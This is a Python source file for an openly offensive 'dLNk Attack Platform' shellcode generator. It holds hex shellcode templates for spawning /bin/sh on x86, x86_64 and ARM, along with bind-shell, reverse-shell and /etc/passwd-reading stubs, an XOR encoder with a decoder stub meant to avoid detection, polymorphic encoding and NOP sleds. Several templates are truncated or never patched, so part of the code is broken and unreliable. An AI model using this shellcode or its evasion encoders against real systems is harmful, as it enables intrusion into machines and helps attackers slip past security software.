"""
Shellcode Generator for dLNk Attack Platform
Generates shellcode for various purposes and architectures
"""

import asyncio
from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy
import struct
from typing import Dict, List, Optional
import logging

log = logging.getLogger(__name__)


class ShellcodeGenerator:
    """
    Shellcode Generator
    
    Features:
    - Generate shellcode for multiple architectures
    - Encode/obfuscate shellcode
    - Avoid bad characters
    - Generate polymorphic shellcode
    """
    
    def __init__(self, architecture: str = 'x86_64'):
        self.architecture = architecture
        self.shellcode_templates = self._load_templates()
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute attack"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Implement attack logic here
            results = {'status': 'not_implemented'}
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} executed",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _load_templates(self) -> Dict:
        """Load shellcode templates"""
        
        return {
            'x86_64': {
                'execve_bin_sh': bytes.fromhex(
                    # execve("/bin/sh", NULL, NULL)
                    '4831c0'      # xor rax, rax
                    '50'          # push rax
                    '48bb2f62696e2f736800'  # movabs rbx, 0x68732f6e69622f
                    '53'          # push rbx
                    '4889e7'      # mov rdi, rsp
                    '50'          # push rax
                    '4889e2'      # mov rdx, rsp
                    '57'          # push rdi
                    '4889e6'      # mov rsi, rsp
                    'b03b'        # mov al, 59
                    '0f05'        # syscall
                ),
                
                'bind_shell': bytes.fromhex(
                    # Bind shell on port 4444
                    '4831c0'      # xor rax, rax
                    '4831ff'      # xor rdi, rdi
                    '4831f6'      # xor rsi, rsi
                    'b029'        # mov al, 41 (socket)
                    '40b702'      # mov dil, 2
                    '40b601'      # mov sil, 1
                    '0f05'        # syscall
                ),
                
                'reverse_shell': bytes.fromhex(
                    # Reverse shell to 127.0.0.1:4444
                    '4831c0'      # xor rax, rax
                    '4831ff'      # xor rdi, rdi
                    '4831f6'      # xor rsi, rsi
                    'b029'        # mov al, 41 (socket)
                    '40b702'      # mov dil, 2
                    '40b601'      # mov sil, 1
                    '0f05'        # syscall
                ),
                
                'read_file': bytes.fromhex(
                    # Read /etc/passwd
                    '4831c0'      # xor rax, rax
                    'b002'        # mov al, 2 (open)
                    '0f05'        # syscall
                ),
            },
            
            'x86': {
                'execve_bin_sh': bytes.fromhex(
                    # execve("/bin/sh", NULL, NULL)
                    '31c0'        # xor eax, eax
                    '50'          # push eax
                    '682f2f7368'  # push 0x68732f2f
                    '682f62696e'  # push 0x6e69622f
                    '89e3'        # mov ebx, esp
                    '50'          # push eax
                    '53'          # push ebx
                    '89e1'        # mov ecx, esp
                    'b00b'        # mov al, 11
                    'cd80'        # int 0x80
                ),
            },
            
            'arm': {
                'execve_bin_sh': bytes.fromhex(
                    # ARM execve shellcode
                    '01308fe2'    # add r3, pc, #1
                    '13ff2fe1'    # bx r3
                ),
            }
        }
    
    async def generate_execve_shellcode(
        self,
        command: str = '/bin/sh',
        args: List[str] = None
    ) -> bytes:
        """
        Generate execve shellcode
        
        Args:
            command: Command to execute
            args: Command arguments
        
        Returns:
            Shellcode bytes
        """
        log.info(f"[ShellcodeGenerator] Generating execve shellcode for: {command}")
        
        if self.architecture not in self.shellcode_templates:
            log.error(f"[ShellcodeGenerator] Unsupported architecture: {self.architecture}")
            return b''
        
        # Get template
        template = self.shellcode_templates[self.architecture].get('execve_bin_sh', b'')
        
        # For custom commands, we'd need to modify the shellcode
        # For now, return template
        
        log.info(f"[ShellcodeGenerator] Generated shellcode: {len(template)} bytes")
        
        return template
    
    async def generate_bind_shell(
        self,
        port: int = 4444
    ) -> bytes:
        """
        Generate bind shell shellcode
        
        Args:
            port: Port to bind to
        
        Returns:
            Shellcode bytes
        """
        log.info(f"[ShellcodeGenerator] Generating bind shell on port {port}")
        
        if self.architecture == 'x86_64':
            # Base bind shell shellcode
            shellcode = bytearray(self.shellcode_templates['x86_64'].get('bind_shell', b''))
            
            # Modify port (simplified - real implementation would patch correctly)
            # Port is in network byte order
            port_bytes = struct.pack('>H', port)
            
            log.info(f"[ShellcodeGenerator] Generated bind shell: {len(shellcode)} bytes")
            
            return bytes(shellcode)
        
        return b''
    
    async def generate_reverse_shell(
        self,
        host: str = '127.0.0.1',
        port: int = 4444
    ) -> bytes:
        """
        Generate reverse shell shellcode
        
        Args:
            host: Target host
            port: Target port
        
        Returns:
            Shellcode bytes
        """
        log.info(f"[ShellcodeGenerator] Generating reverse shell to {host}:{port}")
        
        if self.architecture == 'x86_64':
            shellcode = bytearray(self.shellcode_templates['x86_64'].get('reverse_shell', b''))
            
            # Patch host and port (simplified)
            
            log.info(f"[ShellcodeGenerator] Generated reverse shell: {len(shellcode)} bytes")
            
            return bytes(shellcode)
        
        return b''
    
    async def encode_shellcode(
        self,
        shellcode: bytes,
        encoder: str = 'xor',
        key: int = 0xAA
    ) -> bytes:
        """
        Encode shellcode to avoid detection
        
        Args:
            shellcode: Original shellcode
            encoder: Encoding method ('xor', 'add', 'sub')
            key: Encoding key
        
        Returns:
            Encoded shellcode with decoder stub
        """
        log.info(f"[ShellcodeGenerator] Encoding shellcode with {encoder}")
        
        if encoder == 'xor':
            # XOR encode
            encoded = bytearray()
            for byte in shellcode:
                encoded.append(byte ^ key)
            
            # Create decoder stub (x86_64)
            decoder = bytearray.fromhex(
                'eb0e'        # jmp short +14
                '5e'          # pop rsi (address of encoded shellcode)
                '31c9'        # xor ecx, ecx
                'b9'          # mov ecx, length
            )
            decoder += struct.pack('<I', len(shellcode))
            decoder += bytearray.fromhex(
                '803e'        # xor byte [rsi], key
            )
            decoder.append(key)
            decoder += bytearray.fromhex(
                '48ffc6'      # inc rsi
                'e2f7'        # loop -9
                'ffe6'        # jmp rsi
                'e8edffffff'  # call -19
            )
            
            result = bytes(decoder) + bytes(encoded)
            
            log.info(f"[ShellcodeGenerator] Encoded: {len(result)} bytes (original: {len(shellcode)})")
            
            return result
        
        elif encoder == 'add':
            # ADD encode
            encoded = bytearray()
            for byte in shellcode:
                encoded.append((byte + key) % 256)
            
            return bytes(encoded)
        
        return shellcode
    
    async def avoid_bad_chars(
        self,
        shellcode: bytes,
        bad_chars: List[int]
    ) -> bytes:
        """
        Modify shellcode to avoid bad characters
        
        Args:
            shellcode: Original shellcode
            bad_chars: List of bad character bytes
        
        Returns:
            Modified shellcode
        """
        log.info(f"[ShellcodeGenerator] Avoiding bad chars: {[hex(c) for c in bad_chars]}")
        
        # Check if shellcode contains bad chars
        has_bad_chars = any(byte in bad_chars for byte in shellcode)
        
        if not has_bad_chars:
            log.info("[ShellcodeGenerator] No bad characters found")
            return shellcode
        
        # Try encoding to avoid bad chars
        for key in range(1, 256):
            encoded = await self.encode_shellcode(shellcode, 'xor', key)
            
            # Check if encoded version avoids bad chars
            if not any(byte in bad_chars for byte in encoded):
                log.info(f"[ShellcodeGenerator] Found encoding key: {hex(key)}")
                return encoded
        
        log.warning("[ShellcodeGenerator] Could not avoid all bad characters")
        return shellcode
    
    async def generate_polymorphic_shellcode(
        self,
        shellcode: bytes,
        iterations: int = 3
    ) -> bytes:
        """
        Generate polymorphic shellcode that changes each time
        
        Args:
            shellcode: Original shellcode
            iterations: Number of polymorphic layers
        
        Returns:
            Polymorphic shellcode
        """
        log.info(f"[ShellcodeGenerator] Generating polymorphic shellcode ({iterations} layers)")
        
        result = shellcode
        
        for i in range(iterations):
            # Apply random encoding
            import random
            key = random.randint(1, 255)
            encoder = random.choice(['xor', 'add'])
            
            result = await self.encode_shellcode(result, encoder, key)
        
        log.info(f"[ShellcodeGenerator] Polymorphic shellcode: {len(result)} bytes")
        
        return result
    
    async def generate_nop_sled(
        self,
        length: int = 100
    ) -> bytes:
        """
        Generate NOP sled
        
        Args:
            length: Length of NOP sled
        
        Returns:
            NOP sled bytes
        """
        if self.architecture == 'x86_64' or self.architecture == 'x86':
            # x86/x86_64 NOP is 0x90
            return b'\x90' * length
        elif self.architecture == 'arm':
            # ARM NOP is 0x00000000
            return b'\x00\x00\x00\x00' * (length // 4)
        else:
            return b'\x90' * length
    
    async def test_shellcode(
        self,
        shellcode: bytes
    ) -> Dict:
        """
        Test shellcode for issues
        
        Args:
            shellcode: Shellcode to test
        
        Returns:
            Test results
        """
        log.info("[ShellcodeGenerator] Testing shellcode...")
        
        results = {
            'length': len(shellcode),
            'null_bytes': shellcode.count(b'\x00'),
            'printable_ratio': sum(32 <= b <= 126 for b in shellcode) / len(shellcode) if shellcode else 0,
            'entropy': self._calculate_entropy(shellcode),
            'issues': []
        }
        
        # Check for null bytes
        if results['null_bytes'] > 0:
            results['issues'].append(f"Contains {results['null_bytes']} null bytes")
        
        # Check length
        if len(shellcode) > 1000:
            results['issues'].append("Shellcode is very long")
        
        # Check entropy (high entropy might indicate encryption/encoding)
        if results['entropy'] > 7.5:
            results['issues'].append("High entropy - might trigger detection")
        
        return results
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0.0
        
        import math
        entropy = 0.0
        
        for byte_val in range(256):
            freq = data.count(byte_val) / len(data)
            if freq > 0:
                entropy -= freq * math.log2(freq)
        
        return entropy


if __name__ == '__main__':
    async def test():
        generator = ShellcodeGenerator(architecture='x86_64')
        
        # Generate execve shellcode
        execve_sc = await generator.generate_execve_shellcode('/bin/sh')
        print(f"Execve shellcode: {len(execve_sc)} bytes")
        print(f"Hex: {execve_sc.hex()}")
        
        # Test shellcode
        test_results = await generator.test_shellcode(execve_sc)
        print(f"\nShellcode test results:")
        print(f"  Length: {test_results['length']}")
        print(f"  Null bytes: {test_results['null_bytes']}")
        print(f"  Entropy: {test_results['entropy']:.2f}")
        print(f"  Issues: {test_results['issues']}")
        
        # Encode shellcode
        encoded = await generator.encode_shellcode(execve_sc, 'xor', 0xAA)
        print(f"\nEncoded shellcode: {len(encoded)} bytes")
        
        # Generate NOP sled
        nop_sled = await generator.generate_nop_sled(50)
        print(f"\nNOP sled: {len(nop_sled)} bytes")
    
    asyncio.run(test())

